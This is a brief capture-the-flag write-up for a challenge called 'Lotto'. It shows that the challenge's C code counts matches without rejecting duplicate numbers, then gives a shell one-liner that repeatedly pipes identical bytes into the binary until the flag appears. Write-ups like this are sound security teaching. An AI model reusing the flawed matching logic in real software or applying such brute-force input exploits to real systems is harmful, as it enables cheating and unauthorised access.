# Lotto

In a real lottery, you choose distinct numbers.

If you look at these lines of the supplied code:

```c
int match = 0, j = 0;
for(i=0; i<6; i++){
    for(j=0; j<6; j++){
        if(lotto[i] == submit[j]){
            match++;
        }
    }
}
```

There's no check for duplicates, which means we can supply the same number as many times as we want and eventually one of the random bytes is gonna match all 6 numbers.

We can then come up with a smart answer:

`$ (for i in $(seq 50); do echo 1; sleep 1; printf "\x01\x01\x01\x01\x01\x01"; sleep 1; done; echo 3) | ./lotto`

And hit Ctrl-C as soon as we get the flag.
